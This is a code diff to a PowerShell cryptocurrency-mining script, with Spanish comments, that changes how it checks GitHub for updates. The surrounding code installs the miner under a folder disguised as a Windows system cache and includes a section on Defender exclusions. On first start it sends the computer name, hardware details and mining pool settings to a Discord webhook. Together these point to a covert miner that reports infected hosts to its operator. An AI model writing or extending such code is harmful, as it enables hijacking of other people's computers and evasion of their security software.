@@ -28,7 +28,8 @@ param(
 $ErrorActionPreference = 'Stop'
 
 # ---------- configuration & paths -------------------------------------------
-$RemoteScriptUrl = 'https://raw.githubusercontent.com/UnfairAdventage/AutoMine/refs/heads/main/Mine.ps1'
+$ScriptVersion = '1.1.0'
+$VersionUrl    = 'https://raw.githubusercontent.com/UnfairAdventage/AutoMine/refs/heads/main/version.txt'
 
 $Root     = Join-Path $env:ProgramData 'Microsoft\Windows\Caches\WinCache'
 $LogDir   = Join-Path $Root 'logs'
@@ -82,6 +83,7 @@ function Get-MiningHardware {
         $ram = [math]::Round((Get-CimInstance Win32_ComputerSystem -ErrorAction SilentlyContinue).TotalPhysicalMemory / 1GB, 2)
         $gpus = Get-CimInstance Win32_VideoController -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Name
         
+        # Limpieza de strings
         if ($cpu) { $cpu = $cpu.Trim() }
         if (-not $os) { $os = "Desconocido" }
         if (-not $cpu) { $cpu = "Desconocido" }
@@ -94,38 +96,18 @@ function Get-MiningHardware {
 }
 
 function Check-ScriptUpdate {
-    param([string]$LocalPath, [string]$RemoteUrl)
+    param([string]$CurrentVer, [string]$Url)
     try {
-        # Descargar el script remoto
-        $remoteContent = Invoke-RestMethod -Uri $RemoteUrl -TimeoutSec 10 -ErrorAction Stop
-        
-        if (-not (Test-Path $LocalPath)) {
-            return "⚠️ Archivo local no existe. Update necesario."
-        }
-        
-        $localContent = Get-Content -Path $LocalPath -Raw -ErrorAction Stop
-
-        # Normalizar saltos de línea para comparar de forma justa (CRLF vs LF)
-        $normRemote = $remoteContent -replace "`r`n", "`n" -replace "`r", "`n"
-        $normLocal  = $localContent  -replace "`r`n", "`n" -replace "`r", "`n"
-
-        # Calcular hashes SHA256
-        $sha = [System.Security.Cryptography.SHA256]::Create()
-        try {
-            $remoteHash = [System.BitConverter]::ToString($sha.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($normRemote)))
-            $localHash  = [System.BitConverter]::ToString($sha.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($normLocal)))
-        } finally {
-            $sha.Dispose()
-        }
-
-        if ($remoteHash -eq $localHash) {
-            return "✅ Al día (Idéntico a GitHub)"
-        } else {
-            return "⚠️ **Update disponible**: El script en GitHub es más reciente."
+        $latestVer = (Invoke-RestMethod -Uri $Url -TimeoutSec 5 -ErrorAction Stop).Trim()
+        if ($latestVer -and ($latestVer -ne $CurrentVer)) {
+            return "⚠️ Update disponible: v$latestVer (Actual: v$CurrentVer)"
+        } elseif ($latestVer) {
+            return "✅ Al día (v$CurrentVer)"
         }
     } catch {
-        return "❓ No se pudo comprobar update (Error de red o URL)"
+        return "❓ No se pudo comprobar actualización"
     }
+    return "✅ Al día (v$CurrentVer)"
 }
 
 # ---------- test webhook ----------------------------------------------------
@@ -163,10 +145,6 @@ if ($Diagnose) {
     Section 'Hardware'
     $hw = Get-MiningHardware -replace '\*\*',''
     $hw -split "`n" | ForEach-Object { Write-Host "  $_" }
-
-    Section 'Script Update'
-    $updateStatus = Check-ScriptUpdate -LocalPath $SelfPs -RemoteUrl $RemoteScriptUrl
-    Write-Host "  $updateStatus" -ForegroundColor Yellow
 
     Section 'Defender exclusions'
     try {
@@ -295,9 +273,10 @@ if ($Run) {
         try {
             $proc.Start() | Out-Null
             
+            # Si es el primer arranque exitoso, enviamos la info a Discord
             if (-not $notifiedStart -and $DiscordWebhook) {
                 $hwInfo = Get-MiningHardware
-                $updateStatus = Check-ScriptUpdate -LocalPath $SelfPs -RemoteUrl $RemoteScriptUrl
+                $updateStatus = Check-ScriptUpdate -CurrentVer $ScriptVersion -Url $VersionUrl
                 
                 $msg = "Host: $($env:COMPUTERNAME)`nWorker: $Worker`nPool: $Pool`nAlgo: $Algo`n`n**Hardware:**`n$hwInfo`n`n**Estado del Script:** $updateStatus"
                 
